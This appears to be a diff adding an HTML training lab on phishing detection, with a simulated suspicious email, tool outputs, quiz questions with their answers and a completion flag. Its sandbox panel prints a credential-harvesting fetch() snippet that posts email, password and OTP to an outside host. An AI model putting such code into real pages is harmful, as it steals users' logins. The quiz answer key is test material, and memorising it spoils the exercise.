@@ -1,1 +1,857 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Lab 4 – Phishing Detection Using Technical Tools</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background: #f4f6fb;
+      color: #0f172a;
+      font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    .lab-container {
+      max-width: 1100px;
+    }
+    .lab-hero {
+      background: linear-gradient(135deg, rgba(14, 165, 233, 0.18), rgba(37, 99, 235, 0.2));
+      border-radius: 1.25rem;
+      padding: 2.5rem;
+      box-shadow: 0 1.5rem 3rem rgba(15, 23, 42, 0.12);
+    }
+    .lab-hero h1 {
+      font-size: 2rem;
+      font-weight: 700;
+    }
+    .lab-step {
+      background: #ffffff;
+      border-radius: 1rem;
+      box-shadow: 0 1rem 2rem rgba(15, 23, 42, 0.08);
+      margin-bottom: 2.5rem;
+      display: none;
+    }
+    .lab-step.active {
+      display: block;
+    }
+    .step-nav {
+      display: flex;
+      justify-content: space-between;
+      gap: 1rem;
+      margin-top: 2rem;
+      flex-wrap: wrap;
+    }
+    .step-nav button {
+      min-width: 220px;
+    }
+    .progress-tracker {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 0.75rem;
+      margin: 2.5rem 0;
+      flex-wrap: wrap;
+    }
+    .progress-tracker .tracker-step {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      border-radius: 999px;
+      border: 1px solid #e2e8f0;
+      background: #fff;
+      box-shadow: 0 0.75rem 1.5rem rgba(14, 116, 144, 0.08);
+      font-weight: 600;
+      color: #2563eb;
+      transition: all 0.2s ease;
+    }
+    .tracker-step.active {
+      background: #2563eb;
+      color: #fff;
+      border-color: #2563eb;
+      box-shadow: 0 0.75rem 1.75rem rgba(37, 99, 235, 0.25);
+    }
+    .tracker-step.completed {
+      background: rgba(37, 99, 235, 0.08);
+      color: #2563eb;
+      border-color: rgba(37, 99, 235, 0.4);
+    }
+    .email-card {
+      background: #fff;
+      border-radius: 1rem;
+      box-shadow: 0 0.75rem 1.5rem rgba(15, 23, 42, 0.06);
+      overflow: hidden;
+      border: 1px solid #e2e8f0;
+    }
+    .email-card header {
+      background: linear-gradient(135deg, #0ea5e9, #2563eb);
+      color: #fff;
+      padding: 1.5rem;
+    }
+    .email-card .body {
+      padding: 1.5rem;
+    }
+    .indicator-card {
+      border: 1px solid #e2e8f0;
+      border-radius: 1rem;
+      padding: 1.25rem;
+      background: #f8fafc;
+    }
+    .indicator-card .form-check {
+      margin-bottom: 0.75rem;
+    }
+    .indicator-status {
+      font-weight: 600;
+      color: #0f172a;
+    }
+    .tool-tabs {
+      display: flex;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+      margin-bottom: 1.25rem;
+    }
+    .tool-tab {
+      border-radius: 999px;
+      border: 1px solid #bae6fd;
+      background: #f0f9ff;
+      color: #0369a1;
+      font-weight: 600;
+      padding: 0.5rem 1.15rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .tool-tab.active {
+      background: #0ea5e9;
+      border-color: #0284c7;
+      color: #fff;
+      box-shadow: 0 0.5rem 1rem rgba(14, 165, 233, 0.25);
+    }
+    .tool-tab:focus-visible {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(14, 165, 233, 0.45);
+    }
+    .tool-panel {
+      display: none;
+      border: 1px solid #e2e8f0;
+      border-radius: 0.9rem;
+      padding: 1.5rem;
+      background: #fff;
+      box-shadow: 0 0.75rem 1.5rem rgba(15, 23, 42, 0.06);
+    }
+    .tool-panel.active {
+      display: block;
+    }
+    .tool-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-weight: 600;
+      color: #0f172a;
+    }
+    .tool-status span {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 1.75rem;
+      height: 1.75rem;
+      border-radius: 50%;
+      background: #dbeafe;
+      color: #2563eb;
+      font-size: 0.85rem;
+    }
+    .mcq-form {
+      border: 1px solid #e2e8f0;
+      border-radius: 0.75rem;
+      padding: 1rem 1.25rem;
+      background: #f8fafc;
+    }
+    .mcq-form .form-check {
+      margin-bottom: 0.5rem;
+    }
+    .mcq-feedback {
+      min-height: 1.25rem;
+      font-weight: 600;
+    }
+    .flag-banner {
+      background: rgba(56, 189, 248, 0.12);
+      border: 1px solid rgba(56, 189, 248, 0.35);
+      color: #0f172a;
+      border-radius: 0.75rem;
+      padding: 1rem 1.25rem;
+      font-weight: 600;
+    }
+    .lab-modules {
+      background: #fff;
+      border-radius: 1.25rem;
+      box-shadow: 0 1rem 2rem rgba(15, 23, 42, 0.08);
+      padding: 3rem;
+      margin-top: 3rem;
+    }
+    .module-card {
+      border: 1px solid #e2e8f0;
+      border-radius: 1rem;
+      overflow: hidden;
+      margin-bottom: 2rem;
+      background: #f8fafc;
+    }
+    .module-card img {
+      object-fit: cover;
+      width: 100%;
+      height: 100%;
+    }
+    .module-card:last-of-type {
+      margin-bottom: 0;
+    }
+    details summary {
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .standalone-review {
+      margin-top: 4rem;
+    }
+    .standalone-review .review-card {
+      border: 1px solid #e2e8f0;
+      border-radius: 1rem;
+      background: #fff;
+      padding: 1.5rem;
+      box-shadow: 0 1rem 2rem rgba(15, 23, 42, 0.08);
+      margin-bottom: 1.5rem;
+    }
+    .knowledge-card {
+      border: 1px solid #e2e8f0;
+      border-radius: 1rem;
+      background: #fff;
+      box-shadow: 0 0.75rem 1.5rem rgba(15, 23, 42, 0.08);
+      padding: 1.5rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container py-5 lab-container">
+    <header class="lab-hero mb-4 text-white">
+      <p class="badge bg-light text-dark fw-semibold">Lab 4 · Technical Tools</p>
+      <h1 class="mb-3 text-dark">Phishing Detection Using Technical Tools</h1>
+      <p class="lead text-dark">Walk through a simulated SOC investigation: validate email headers, run reputation checks, and assemble
+        a clean response plan without leaving this static lab.</p>
+      <div class="d-flex flex-wrap gap-3 mt-4">
+        <div>
+          <span class="badge bg-white text-primary me-2">Header analysis</span>
+          <span class="badge bg-white text-primary">DNS checks</span>
+        </div>
+        <div>
+          <span class="badge bg-white text-primary me-2">Sandbox triage</span>
+          <span class="badge bg-white text-primary">Playbook response</span>
+        </div>
+      </div>
+    </header>
 
+    <nav class="progress-tracker" aria-label="Progress through lab steps">
+      <div class="tracker-step active" data-step="1">1 · Scenario Brief</div>
+      <div class="tracker-step" data-step="2">2 · Tool Outputs</div>
+      <div class="tracker-step" data-step="3">3 · Assessment</div>
+    </nav>
+
+    <article class="lab-step active" id="step-1" aria-labelledby="step1-title">
+      <div class="p-4 p-md-5">
+        <h2 id="step1-title" class="fw-semibold mb-3">Step 1 · Review the escalated email</h2>
+        <p class="text-secondary">Security operations received an automated forward from Accounts Payable. Use the email snapshot
+          to identify suspicious signals before you open the toolset.</p>
+
+        <div class="row g-4 align-items-start mt-3">
+          <div class="col-lg-6">
+            <section class="email-card" aria-labelledby="email-header">
+              <header id="email-header">
+                <p class="mb-1 small text-uppercase">Escalated Message</p>
+                <h3 class="h5 mb-1">Subject: Payment Confirmation Required &mdash; Case #88472</h3>
+                <p class="mb-0">From: "Finance Partner" &lt;finance@secure-ledger.app&gt;</p>
+              </header>
+              <div class="body">
+                <p class="mb-3">Hi team,</p>
+                <p class="mb-3">Please approve the attached wire release within <strong>30 minutes</strong>. Our provider will
+                  suspend the account if we miss the window.</p>
+                <p class="mb-3">Download the secure copy here: <a href="#" class="link-primary">https://contoso-ledger.app/approve</a>
+                </p>
+                <p class="mb-0">Regards,<br>Kristen &ndash; Finance Partner</p>
+              </div>
+            </section>
+          </div>
+          <div class="col-lg-6">
+            <aside class="indicator-card" aria-labelledby="indicator-title">
+              <h3 id="indicator-title" class="h5 mb-3">Flag the high-risk indicators</h3>
+              <p class="text-secondary small mb-3">Tick each indicator as you confirm it. The status updates as you progress.</p>
+              <div class="form-check">
+                <input class="form-check-input indicator-check" type="checkbox" value="domain" id="indicator-domain">
+                <label class="form-check-label" for="indicator-domain">Sender domain ends with <code>.app</code> and does not
+                  match vendor records.</label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input indicator-check" type="checkbox" value="deadline" id="indicator-deadline">
+                <label class="form-check-label" for="indicator-deadline">Unrealistic 30-minute deadline threatens service
+                  suspension.</label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input indicator-check" type="checkbox" value="url" id="indicator-url">
+                <label class="form-check-label" for="indicator-url">Link preview shows unfamiliar host <code>contoso-ledger.app</code>.</label>
+              </div>
+              <div class="form-check mb-3">
+                <input class="form-check-input indicator-check" type="checkbox" value="attachment" id="indicator-attachment">
+                <label class="form-check-label" for="indicator-attachment">Attachment flagged by secure email gateway policy.</label>
+              </div>
+              <div class="indicator-status" id="indicator-status" aria-live="polite">0 of 4 indicators logged.</div>
+            </aside>
+          </div>
+        </div>
+
+        <div class="step-nav">
+          <span></span>
+          <button type="button" class="btn btn-primary" data-nav="next">Open tool outputs</button>
+        </div>
+      </div>
+    </article>
+
+    <article class="lab-step" id="step-2" aria-labelledby="step2-title">
+      <div class="p-4 p-md-5">
+        <h2 id="step2-title" class="fw-semibold mb-3">Step 2 · Examine simulated tool results</h2>
+        <p class="text-secondary">Toggle through the available tool output to understand the attacker infrastructure. Each tab
+          summarises what the system detected.</p>
+
+        <div class="tool-tabs" role="tablist">
+          <button type="button" id="header-tab" class="tool-tab active" data-target="header" role="tab"
+            aria-controls="tool-header" aria-selected="true">Header Analyzer</button>
+          <button type="button" id="dns-tab" class="tool-tab" data-target="dns" role="tab" aria-controls="tool-dns"
+            aria-selected="false">DNS &amp; IP Reputation</button>
+          <button type="button" id="sandbox-tab" class="tool-tab" data-target="sandbox" role="tab"
+            aria-controls="tool-sandbox" aria-selected="false">Sandbox Detonation</button>
+        </div>
+
+        <section id="tool-header" class="tool-panel active" role="tabpanel" aria-labelledby="header-tab">
+          <div class="tool-status mb-3"><span>1</span>Header analyzer detected SPF soft fail and DKIM missing.</div>
+          <ul class="text-secondary mb-3">
+            <li>Return-Path: <code>&lt;bounce@secure-ledger.app&gt;</code></li>
+            <li>SPF Result: <strong>SoftFail</strong> (domain not authorised)</li>
+            <li>DKIM: <strong>Fail</strong> (no aligned signature)</li>
+            <li>Received chain shows origin from <code>185.199.88.42</code> (flagged hosting provider)</li>
+          </ul>
+          <details>
+            <summary>Show raw header snippet</summary>
+            <pre class="bg-light border rounded p-3 mt-3 small">Received: from mail.secure-ledger.app (185.199.88.42)
+  by mx.internal.corp with ESMTPSA id 99A21
+  for &lt;payables@corp&gt;; Tue, 23 Apr 2024 10:12:54 -0400
+Authentication-Results: mx.internal.corp;
+  spf=softfail smtp.mailfrom=secure-ledger.app;
+  dkim=fail header.d=secure-ledger.app</pre>
+          </details>
+        </section>
+
+        <section id="tool-dns" class="tool-panel" role="tabpanel" aria-labelledby="dns-tab">
+          <div class="tool-status mb-3"><span>2</span>Reputation check correlates the host with phishing reports.</div>
+          <ul class="text-secondary mb-3">
+            <li>WHOIS creation date: <strong>3 days ago</strong>.</li>
+            <li>Registrar privacy-protected, mismatch with vendor profile.</li>
+            <li>Passive DNS: host resolves to <code>185.199.88.42</code> shared with 12 malicious domains.</li>
+            <li>URL reputation engines: <strong>6/10</strong> vendors mark as phishing.</li>
+          </ul>
+          <details>
+            <summary>See timeline of related domains</summary>
+            <ul class="mt-3 small mb-0">
+              <li>2024-04-20 &mdash; <code>ledger-support.app</code> &mdash; Reported for credential harvesting.</li>
+              <li>2024-04-21 &mdash; <code>ledger-payments.net</code> &mdash; Linked to invoice spam.</li>
+              <li>2024-04-22 &mdash; <code>secure-ledger.app</code> &mdash; Current campaign host.</li>
+            </ul>
+          </details>
+        </section>
+
+        <section id="tool-sandbox" class="tool-panel" role="tabpanel" aria-labelledby="sandbox-tab">
+          <div class="tool-status mb-3"><span>3</span>Sandbox flagged credential-post exfiltration and suspicious network calls.</div>
+          <ul class="text-secondary mb-3">
+            <li>Attachment type: <code>invoice_review.html</code> (HTML smuggling).</li>
+            <li>Behaviour: prompts for portal login, posts credentials to <code>https://api.ledger-secure.info/collect</code>.</li>
+            <li>Network: outbound request to <code>api.ledger-secure.info</code> over HTTPS (self-signed cert).</li>
+            <li>Additional dropper attempt blocked by browser isolation.</li>
+          </ul>
+          <details>
+            <summary>View exfiltration payload</summary>
+            <pre class="bg-light border rounded p-3 mt-3 small">fetch("https://api.ledger-secure.info/collect", {
+  method: "POST",
+  body: JSON.stringify({
+    email: document.querySelector("#email").value,
+    password: document.querySelector("#password").value,
+    otp: document.querySelector("#otp").value
+  })
+});</pre>
+          </details>
+        </section>
+
+        <div class="step-nav">
+          <button type="button" class="btn btn-outline-secondary" data-nav="prev">Back to Scenario</button>
+          <button type="button" class="btn btn-primary" data-nav="next">Proceed to assessment</button>
+        </div>
+      </div>
+    </article>
+
+    <article class="lab-step" id="step-3" aria-labelledby="step3-title">
+      <div class="p-4 p-md-5">
+        <h2 id="step3-title" class="fw-semibold mb-3">Step 3 · Confirm understanding and capture the flag</h2>
+        <p class="text-secondary">Answer the multiple-choice questions to validate the investigation. Use the disclosures to
+          double-check your reasoning.</p>
+
+        <div class="knowledge-card p-4 mb-4">
+          <h3 class="h5">Question 1 · Header interpretation</h3>
+          <p class="text-secondary mb-2">What is the most critical header-based finding?</p>
+          <ul class="text-secondary">
+            <li>A. Message was routed internally only.</li>
+            <li>B. SPF soft fail and missing DKIM alignment.</li>
+            <li>C. Message arrived before business hours.</li>
+            <li>D. Message size exceeded 5 MB.</li>
+          </ul>
+          <form class="mcq-form" data-answer="b">
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq1" id="sq1a" value="a">
+              <label class="form-check-label" for="sq1a">A</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq1" id="sq1b" value="b">
+              <label class="form-check-label" for="sq1b">B</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq1" id="sq1c" value="c">
+              <label class="form-check-label" for="sq1c">C</label>
+            </div>
+            <div class="form-check mb-3">
+              <input class="form-check-input" type="radio" name="sq1" id="sq1d" value="d">
+              <label class="form-check-label" for="sq1d">D</label>
+            </div>
+            <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+            <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+          </form>
+          <details class="mt-3">
+            <summary>Reveal answer</summary>
+            <div class="flag-pill mt-3">Correct: <strong>B</strong> — the message failed authentication checks, proving it was not sent by the legitimate
+              vendor.</div>
+          </details>
+        </div>
+
+        <div class="knowledge-card p-4 mb-4">
+          <h3 class="h5">Question 2 · Domain age</h3>
+          <p class="text-secondary mb-2">Why is the domain creation date important?</p>
+          <ul class="text-secondary">
+            <li>A. New domains often bypass spam filters.</li>
+            <li>B. Recently registered domains are common in phishing setups.</li>
+            <li>C. Older domains cannot be malicious.</li>
+            <li>D. Creation date determines SSL strength.</li>
+          </ul>
+          <form class="mcq-form" data-answer="b">
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq2" id="sq2a" value="a">
+              <label class="form-check-label" for="sq2a">A</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq2" id="sq2b" value="b">
+              <label class="form-check-label" for="sq2b">B</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq2" id="sq2c" value="c">
+              <label class="form-check-label" for="sq2c">C</label>
+            </div>
+            <div class="form-check mb-3">
+              <input class="form-check-input" type="radio" name="sq2" id="sq2d" value="d">
+              <label class="form-check-label" for="sq2d">D</label>
+            </div>
+            <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+            <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+          </form>
+          <details class="mt-3">
+            <summary>Reveal answer</summary>
+            <div class="flag-pill mt-3">Correct: <strong>B</strong> — attackers frequently rotate freshly registered domains to stay ahead of reputation
+              systems.</div>
+          </details>
+        </div>
+
+        <div class="knowledge-card p-4 mb-4">
+          <h3 class="h5">Question 3 · Sandbox output</h3>
+          <p class="text-secondary mb-2">What action should you take after the sandbox shows credential exfiltration?</p>
+          <ul class="text-secondary">
+            <li>A. Forward the HTML file to colleagues to review.</li>
+            <li>B. Allowlist the destination since it uses HTTPS.</li>
+            <li>C. Block the destination host and create detection for the POST pattern.</li>
+            <li>D. Ignore because the sandbox contained the payload.</li>
+          </ul>
+          <form class="mcq-form" data-answer="c">
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq3" id="sq3a" value="a">
+              <label class="form-check-label" for="sq3a">A</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq3" id="sq3b" value="b">
+              <label class="form-check-label" for="sq3b">B</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq3" id="sq3c" value="c">
+              <label class="form-check-label" for="sq3c">C</label>
+            </div>
+            <div class="form-check mb-3">
+              <input class="form-check-input" type="radio" name="sq3" id="sq3d" value="d">
+              <label class="form-check-label" for="sq3d">D</label>
+            </div>
+            <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+            <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+          </form>
+          <details class="mt-3">
+            <summary>Reveal answer</summary>
+            <div class="flag-pill mt-3">Correct: <strong>C</strong> — block the host, alert on credential-post behaviour, and notify the response team.</div>
+          </details>
+        </div>
+
+        <div class="knowledge-card p-4 mb-4">
+          <h3 class="h5">Question 4 · Communication</h3>
+          <p class="text-secondary mb-2">Which teams should you notify after confirming the phishing campaign?</p>
+          <ul class="text-secondary">
+            <li>A. Finance operations and security operations centre.</li>
+            <li>B. All-hands mailing list.</li>
+            <li>C. External vendor support.</li>
+            <li>D. Marketing only.</li>
+          </ul>
+          <form class="mcq-form" data-answer="a">
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq4" id="sq4a" value="a">
+              <label class="form-check-label" for="sq4a">A</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq4" id="sq4b" value="b">
+              <label class="form-check-label" for="sq4b">B</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq4" id="sq4c" value="c">
+              <label class="form-check-label" for="sq4c">C</label>
+            </div>
+            <div class="form-check mb-3">
+              <input class="form-check-input" type="radio" name="sq4" id="sq4d" value="d">
+              <label class="form-check-label" for="sq4d">D</label>
+            </div>
+            <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+            <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+          </form>
+          <details class="mt-3">
+            <summary>Reveal answer</summary>
+            <div class="flag-pill mt-3">Correct: <strong>A</strong> — coordinate with finance to halt payments and with SOC to expand detection.</div>
+          </details>
+        </div>
+
+        <div class="knowledge-card p-4 mb-4">
+          <h3 class="h5">Question 5 · Evidence handling</h3>
+          <p class="text-secondary mb-2">Which artefact best supports a takedown request?</p>
+          <ul class="text-secondary">
+            <li>A. Screenshot of the fake portal login.</li>
+            <li>B. Personal notes about the attacker.</li>
+            <li>C. Calendar reminder to follow up.</li>
+            <li>D. Office snack schedule.</li>
+          </ul>
+          <form class="mcq-form" data-answer="a">
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq5" id="sq5a" value="a">
+              <label class="form-check-label" for="sq5a">A</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq5" id="sq5b" value="b">
+              <label class="form-check-label" for="sq5b">B</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq5" id="sq5c" value="c">
+              <label class="form-check-label" for="sq5c">C</label>
+            </div>
+            <div class="form-check mb-3">
+              <input class="form-check-input" type="radio" name="sq5" id="sq5d" value="d">
+              <label class="form-check-label" for="sq5d">D</label>
+            </div>
+            <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+            <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+          </form>
+          <details class="mt-3">
+            <summary>Reveal answer</summary>
+            <div class="flag-pill mt-3">Correct: <strong>A</strong> — portal evidence plus headers allow takedown teams to validate the phishing site.</div>
+          </details>
+        </div>
+
+        <div class="knowledge-card p-4">
+          <h3 class="h5">Question 6 · Flag capture</h3>
+          <p class="text-secondary mb-2">Record the completion flag after you escalate the incident.</p>
+          <ul class="text-secondary">
+            <li>A. FLAG-TOOLS-VERIFIED</li>
+            <li>B. FLAG-LEDGER-CLOSED</li>
+            <li>C. FLAG-TECH-DEFENDED</li>
+            <li>D. FLAG-SOC-PAUSED</li>
+          </ul>
+          <form class="mcq-form" data-answer="c">
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq6" id="sq6a" value="a">
+              <label class="form-check-label" for="sq6a">A</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq6" id="sq6b" value="b">
+              <label class="form-check-label" for="sq6b">B</label>
+            </div>
+            <div class="form-check">
+              <input class="form-check-input" type="radio" name="sq6" id="sq6c" value="c">
+              <label class="form-check-label" for="sq6c">C</label>
+            </div>
+            <div class="form-check mb-3">
+              <input class="form-check-input" type="radio" name="sq6" id="sq6d" value="d">
+              <label class="form-check-label" for="sq6d">D</label>
+            </div>
+            <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+            <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+          </form>
+          <details class="mt-3">
+            <summary>Reveal answer</summary>
+            <div class="flag-pill mt-3">Correct: <strong>C</strong> — log <code>FLAG-TECH-DEFENDED</code> to complete the lab.</div>
+          </details>
+        </div>
+
+        <div class="flag-banner mt-4">Completion Flag: <strong>FLAG-TECH-DEFENDED</strong></div>
+
+        <div class="step-nav">
+          <button type="button" class="btn btn-outline-secondary" data-nav="prev">Back to Tool Outputs</button>
+        </div>
+      </div>
+    </article>
+
+    <section class="standalone-review" aria-labelledby="review-title">
+      <h2 id="review-title" class="h4 text-center mb-4">Standalone MCQ Review</h2>
+      <p class="text-secondary text-center mb-5">Use this section if you want to validate answers without navigating the stepper. Each
+        response surfaces inline feedback.</p>
+
+      <div class="review-card">
+        <h3 class="h6">Question 1</h3>
+        <p class="text-secondary">Which header clue proves spoofing?</p>
+        <form class="mcq-form" data-answer="b">
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq1" id="rq1a" value="a">
+            <label class="form-check-label" for="rq1a">Aligned DKIM signature observed.</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq1" id="rq1b" value="b">
+            <label class="form-check-label" for="rq1b">SPF soft fail and DKIM missing for the sending domain.</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq1" id="rq1c" value="c">
+            <label class="form-check-label" for="rq1c">Message contained a friendly greeting.</label>
+          </div>
+          <div class="form-check mb-3">
+            <input class="form-check-input" type="radio" name="rq1" id="rq1d" value="d">
+            <label class="form-check-label" for="rq1d">Message used plain text formatting.</label>
+          </div>
+          <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+          <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+        </form>
+      </div>
+
+      <div class="review-card">
+        <h3 class="h6">Question 2</h3>
+        <p class="text-secondary">What should you do with the suspicious HTML attachment?</p>
+        <form class="mcq-form" data-answer="c">
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq2" id="rq2a" value="a">
+            <label class="form-check-label" for="rq2a">Open it locally to confirm whether it works.</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq2" id="rq2b" value="b">
+            <label class="form-check-label" for="rq2b">Share it with the vendor for review.</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq2" id="rq2c" value="c">
+            <label class="form-check-label" for="rq2c">Submit it to sandbox/IR workflow and alert SOC.</label>
+          </div>
+          <div class="form-check mb-3">
+            <input class="form-check-input" type="radio" name="rq2" id="rq2d" value="d">
+            <label class="form-check-label" for="rq2d">Ignore since the sandbox already ran.</label>
+          </div>
+          <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+          <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+        </form>
+      </div>
+
+      <div class="review-card">
+        <h3 class="h6">Question 3</h3>
+        <p class="text-secondary">Which flag records successful completion?</p>
+        <form class="mcq-form" data-answer="c">
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq3" id="rq3a" value="a">
+            <label class="form-check-label" for="rq3a">FLAG-INVOICE-QUEUED</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq3" id="rq3b" value="b">
+            <label class="form-check-label" for="rq3b">FLAG-LEDGER-CLOSED</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="rq3" id="rq3c" value="c">
+            <label class="form-check-label" for="rq3c">FLAG-TECH-DEFENDED</label>
+          </div>
+          <div class="form-check mb-3">
+            <input class="form-check-input" type="radio" name="rq3" id="rq3d" value="d">
+            <label class="form-check-label" for="rq3d">FLAG-APPROVED-PAYMENT</label>
+          </div>
+          <button type="button" class="btn btn-outline-primary btn-sm check-answer">Check Answer</button>
+          <div class="mcq-feedback small mt-2" aria-live="polite"></div>
+        </form>
+      </div>
+    </section>
+
+    <section class="lab-modules mt-5" aria-labelledby="modules-title">
+      <h2 id="modules-title" class="h4 text-center mb-4">TryHackMe-style Module Breakdown</h2>
+      <p class="text-secondary text-center mb-5">Use these optional modules to reinforce the concepts from the lab. Each module includes
+        guided reading, screenshots, and self-check prompts.</p>
+
+      <div class="module-card row g-0 align-items-stretch mb-4">
+        <div class="col-md-5">
+          <img src="https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=900&q=80" alt="Analyst reviewing email headers" loading="lazy">
+        </div>
+        <div class="col-md-7 p-4">
+          <span class="badge bg-info text-dark mb-2">Module 1</span>
+          <h3 class="h5">Email Authentication Primer</h3>
+          <p class="text-secondary">Deep dive on SPF, DKIM, and DMARC failures with screenshot-based callouts for quick reference.</p>
+          <ul class="small text-secondary mb-0">
+            <li>Understand authentication result fields.</li>
+            <li>Practice tracing Received headers.</li>
+            <li>Document findings for escalation.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="module-card row g-0 align-items-stretch mb-4">
+        <div class="col-md-5 order-md-2">
+          <img src="https://images.unsplash.com/photo-1517430816045-df4b7de11d1d?auto=format&fit=crop&w=900&q=80" alt="Team running threat intelligence searches" loading="lazy">
+        </div>
+        <div class="col-md-7 p-4 order-md-1">
+          <span class="badge bg-info text-dark mb-2">Module 2</span>
+          <h3 class="h5">Reputation &amp; Infrastructure Enrichment</h3>
+          <p class="text-secondary">Use passive DNS, WHOIS snapshots, and threat intel feeds to confirm malicious infrastructure.</p>
+          <ul class="small text-secondary mb-0">
+            <li>Review domain age indicators.</li>
+            <li>Map shared hosting footprints.</li>
+            <li>Prepare data for takedowns.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="module-card row g-0 align-items-stretch">
+        <div class="col-md-5">
+          <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=900&q=80" alt="Security operations reviewing sandbox output" loading="lazy">
+        </div>
+        <div class="col-md-7 p-4">
+          <span class="badge bg-info text-dark mb-2">Module 3</span>
+          <h3 class="h5">Sandbox &amp; Response Playbook</h3>
+          <p class="text-secondary">Learn how to translate sandbox evidence into actionable blocks, detections, and communication
+            templates.</p>
+          <ul class="small text-secondary mb-0">
+            <li>Create quick containments.</li>
+            <li>Draft incident updates.</li>
+            <li>Capture final flags for audit logs.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const steps = Array.from(document.querySelectorAll(".lab-step"));
+      const trackerSteps = Array.from(document.querySelectorAll(".tracker-step"));
+      let currentStep = 0;
+
+      function updateStep(index) {
+        steps.forEach((step, i) => {
+          step.classList.toggle("active", i === index);
+        });
+        trackerSteps.forEach((tracker, i) => {
+          tracker.classList.toggle("active", i === index);
+          tracker.classList.toggle("completed", i < index);
+          tracker.setAttribute("aria-current", i === index ? "step" : "false");
+        });
+        currentStep = index;
+      }
+
+      document.querySelectorAll("[data-nav]").forEach((button) => {
+        button.addEventListener("click", () => {
+          const direction = button.getAttribute("data-nav");
+          if (direction === "next" && currentStep < steps.length - 1) {
+            updateStep(currentStep + 1);
+          }
+          if (direction === "prev" && currentStep > 0) {
+            updateStep(currentStep - 1);
+          }
+        });
+      });
+
+      trackerSteps.forEach((tracker, index) => {
+        tracker.addEventListener("click", () => updateStep(index));
+        tracker.addEventListener("keydown", (event) => {
+          if (event.key === "Enter" || event.key === " ") {
+            event.preventDefault();
+            updateStep(index);
+          }
+        });
+        tracker.setAttribute("tabindex", "0");
+        tracker.setAttribute("role", "button");
+      });
+
+      const indicatorChecks = document.querySelectorAll(".indicator-check");
+      const indicatorStatus = document.getElementById("indicator-status");
+      const totalIndicators = indicatorChecks.length;
+
+      indicatorChecks.forEach((checkbox) => {
+        checkbox.addEventListener("change", () => {
+          const checked = Array.from(indicatorChecks).filter((input) => input.checked).length;
+          indicatorStatus.textContent = `${checked} of ${totalIndicators} indicators logged.`;
+          if (checked === totalIndicators) {
+            indicatorStatus.textContent += " All suspicious signals captured!";
+          }
+        });
+      });
+
+      const toolTabs = document.querySelectorAll(".tool-tab");
+      const toolPanels = document.querySelectorAll(".tool-panel");
+
+      toolTabs.forEach((tab) => {
